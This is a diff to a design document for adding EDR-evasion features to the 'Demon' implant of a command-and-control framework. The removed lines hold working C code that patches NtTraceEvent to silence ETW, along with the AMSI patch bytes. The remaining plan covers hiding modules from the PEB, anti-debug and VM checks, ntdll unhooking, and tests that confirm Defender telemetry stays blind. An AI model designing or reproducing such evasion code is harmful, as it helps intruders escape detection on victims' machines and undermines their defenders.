@@ -8,10 +8,6 @@
 
 The Demon agent's current evasion posture has several gaps that modern EDR products exploit:
 
-- **ETW still logs after AMSI patch.** The memory-patch mode writes `B8 57 00 07 80 C3` over
-  `AmsiScanBuffer` to disable AMSI, but does not patch `NtTraceEvent`. ETW providers (Microsoft
-  Defender, SysInternals, third-party AV) continue to receive kernel-delivered event records
-  describing Demon's activity (process creation, memory allocation, thread injection).
 - **Loaded modules are visible in the PEB.** Any reflective DLL or BOF-supporting DLL that
   Demon loads is enumerable via `CreateToolhelp32Snapshot`, `EnumProcessModules`, or direct
   PEB walks. EDRs routinely check the module list for unexpected entries in high-value processes.
@@ -27,83 +23,29 @@ The Demon agent's current evasion posture has several gaps that modern EDR produ
   and early-stage code paths may still transit hooked ntdll functions before the syscall
   stubs are established.
 
+**Note:** ETW suppression via hardware breakpoint on `NtTraceEvent` is already implemented
+in `AMSIETW_PATCH_HWBP` mode (`Dotnet.c:119-124`, `HwBpExceptions.c:23`). No new ETW work
+is needed here.
+
 ---
 
 ## Scope
 
-Four independent sub-items. Each can be implemented and merged separately. Recommended order:
-Sub-1 (highest impact, low risk) → Sub-4 (must run first if enabled) → Sub-2 → Sub-3.
+Three independent sub-items. Each can be implemented and merged separately. Recommended order:
+Sub-4 (must run first if enabled) → Sub-2 → Sub-3.
 
 ---
 
 ## Design
 
-### Sub-1: Full ETW Patching
+### Sub-1 (REMOVED): ETW Patching
 
-**New files:**
-- `payloads/Demon/src/core/EtwPatch.c`
-- `payloads/Demon/include/core/EtwPatch.h`
-
-**Modified files:**
-- `payloads/Demon/include/common/Defines.h` — add `H_FUNC_NTTRACEEVENT`
-- `payloads/Demon/src/Demon.c` — call `EtwPatchMemory()` in `DemonInit()` alongside AMSI patch
-
-**Goal:** Overwrite the `NtTraceEvent` entry point with a three-byte stub that returns
-zero to all callers, suppressing all ETW event delivery from this process.
-
-**New hash:** Add to `payloads/Demon/include/common/Defines.h`:
-
-```c
-// DJB2 hash of "NTTRACEEVENT" (uppercase, seed 5381, hash = hash * 33 + c, 32-bit unsigned)
-#define H_FUNC_NTTRACEEVENT    0x<computed>
-```
-
-To compute: start with seed `5381`; for each character in `"NTTRACEEVENT"` perform
-`hash = (hash * 33) + (unsigned char)c`; truncate to 32 bits. The final value must be
-verified against the `LdrFunctionAddr` resolver using a debug build before committing.
-
-**Implementation:**
-
-```c
-// payloads/Demon/src/core/EtwPatch.c
-
-#include "core/EtwPatch.h"
-#include "common/Defines.h"   // H_FUNC_NTTRACEEVENT
-#include "core/Instance.h"    // Instance->Win32, Instance->Modules.Ntdll
-
-VOID EtwPatchMemory( VOID )
-{
-    PVOID NtTraceEventAddr = LdrFunctionAddr(
-        Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
-
-    if ( ! NtTraceEventAddr ) return;
-
-    // Patch: xor eax, eax (31 C0) + ret (C3) = 3 bytes
-    // Returns NTSTATUS 0 (STATUS_SUCCESS) to all ETW callers.
-    BYTE  Patch[]     = { 0x31, 0xC0, 0xC3 };
-    DWORD OldProtect  = 0;
-    SIZE_T PatchSize  = sizeof( Patch );
-
-    Instance->Win32.NtProtectVirtualMemory(
-        NtCurrentProcess(), &NtTraceEventAddr, &PatchSize,
-        PAGE_READWRITE, &OldProtect );
-
-    MemCopy( NtTraceEventAddr, Patch, sizeof( Patch ) );
-
-    Instance->Win32.NtProtectVirtualMemory(
-        NtCurrentProcess(), &NtTraceEventAddr, &PatchSize,
-        PAGE_EXECUTE_READ, &OldProtect );
-}
-```
-
-**Wire-in:** In `DemonInit()`, inside the `AMSIETW_PATCH_MEMORY` mode block that already
-calls the AMSI patch, add a call to `EtwPatchMemory()` immediately after the AMSI patch.
-Both patches use the same protection sequence and can be performed consecutively.
-
-**Constraints:**
-- `NtProtectVirtualMemory` is already resolved via indirect syscalls.
-- `LdrFunctionAddr` with a DJB2 hash is the established resolution pattern in this codebase.
-- Never use `PAGE_EXECUTE_READWRITE`. Pattern: `PAGE_READWRITE` → write → `PAGE_EXECUTE_READ`.
+ETW suppression is already implemented. `AMSIETW_PATCH_HWBP` mode adds a hardware breakpoint
+on `NtTraceEvent` via `HwBpEngineAdd( ..., Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 )`
+in `Dotnet.c:119-124`. `HwBpExNtTraceEvent` is the VEH handler in `HwBpExceptions.c:23`.
+`H_FUNC_NTTRACEEVENT` is already defined and `NtTraceEvent` is already resolved in `Demon.c:417`.
+Memory-patch ETW suppression is prohibited by CLAUDE.md (only HwBpEngine permitted). No action
+needed.
 
 ---
 
@@ -395,18 +337,15 @@ using the DJB2 hash mechanism before calling `UnhookNtdll()`.
 
 | File | Change |
 |------|--------|
-| `payloads/Demon/src/core/EtwPatch.c` | New — `EtwPatchMemory()` implementation (Sub-1) |
-| `payloads/Demon/include/core/EtwPatch.h` | New — `EtwPatchMemory()` declaration |
 | `payloads/Demon/src/core/MemoryHide.c` | New — `HideModule()` implementation (Sub-2) |
 | `payloads/Demon/include/core/MemoryHide.h` | New — `HideModule()` declaration |
 | `payloads/Demon/src/core/AntiDebug.c` | New — `AntiDebug_IsAnalysisEnvironment()` (Sub-3) |
 | `payloads/Demon/include/core/AntiDebug.h` | New — declaration |
 | `payloads/Demon/src/core/NtdllUnhook.c` | New — `UnhookNtdll()` implementation (Sub-4) |
 | `payloads/Demon/include/core/NtdllUnhook.h` | New — declaration |
-| `payloads/Demon/src/Demon.c` | Wire all new modules into `DemonInit()` with config guards |
+| `payloads/Demon/src/Demon.c` | Wire Sub-2/Sub-3/Sub-4 into `DemonInit()` with config guards |
 | `payloads/Demon/include/Demon.h` | Add `BOOL AntiDebug` and `BOOL UnhookNtdll` to `Config.Implant` |
-| `payloads/Demon/include/common/Defines.h` | Add `H_FUNC_NTTRACEEVENT` DJB2 hash constant |
-| `payloads/Demon/CMakeLists.txt` | Add all four new `.c` source files |
+| `payloads/Demon/CMakeLists.txt` | Add the three new `.c` source files |
 | `teamserver/pkg/common/builder/builder.go` | Parse `"Anti Debug"` and `"Unhook Ntdll"` bools from payload config |
 | `client/src/UserInterface/Dialogs/Payload.cc` | Add `"Anti Debug"` and `"Unhook Ntdll"` `QCheckBox` items to payload builder UI |
 
@@ -414,22 +353,18 @@ using the DJB2 hash mechanism before calling `UnhookNtdll()`.
 
 ## Tests
 
-1. **ETW patch (Sub-1):** After Demon checks in, verify that the Windows Event Log shows no
-   entries from Microsoft-Windows-Threat-Intelligence or any Defender ETW provider attributable
-   to the Demon process. Use `logman` or a custom ETW consumer to monitor during a Demon run.
-
-2. **Module hide (Sub-2):** Load a known DLL via Demon's inject/load mechanism. Immediately
+1. **Module hide (Sub-2):** Load a known DLL via Demon's inject/load mechanism. Immediately
    after, call `EnumProcessModules` from an injected shellcode or a monitoring process and
    confirm the DLL's base address does not appear in the returned list.
 
-3. **Anti-debug (Sub-3):** Run a `Config.Implant.AntiDebug = TRUE` build under:
+2. **Anti-debug (Sub-3):** Run a `Config.Implant.AntiDebug = TRUE` build under:
    - WinDbg (expect: process exits at startup)
    - x64dbg (expect: process exits at startup)
    - VirtualBox guest without debugger (CPUID hypervisor bit set; expect: process exits)
    - Bare-metal without debugger (expect: normal check-in)
    Document any false-positive hardware platforms encountered during testing.
 
-4. **Unhook ntdll (Sub-4):** Before and after calling `UnhookNtdll()`, dump the first 16
+3. **Unhook ntdll (Sub-4):** Before and after calling `UnhookNtdll()`, dump the first 16
    bytes of `NtOpenProcess` in the loaded ntdll. Before the call the bytes should show the
    EDR hook prologue (typically `E9 xx xx xx xx` JMP or `FF 25 xx xx xx xx` indirect JMP).
    After the call the bytes should show the canonical ntdll stub (`4C 8B D1 B8 xx xx 00 00`
@@ -439,13 +374,6 @@ using the DJB2 hash mechanism before calling `UnhookNtdll()`.
 
 ## Notes
 
-- **ETW patching (Sub-1) is the highest-impact item** and should be implemented first. It
-  is also the lowest risk because `NtTraceEvent` is a leaf function with no callers inside
-  Demon itself.
-- **`H_FUNC_NTTRACEEVENT` hash:** Compute DJB2 of `"NTTRACEEVENT"` (all uppercase) with
-  seed `5381` and `hash = hash * 33 + c` per character, truncated to `DWORD`. Verify the
-  computed constant against a debug build that logs the resolved address before committing
-  it to `Defines.h`.
 - **Module hiding (Sub-2)** is effective against all usermode enumeration tools including
   `Process Hacker`, `TaskMgr` modules view, and `EnumProcessModules`. It does not defeat
   kernel-mode detection via `DKOM` inspection or `PsSetLoadImageNotifyRoutine` callbacks that
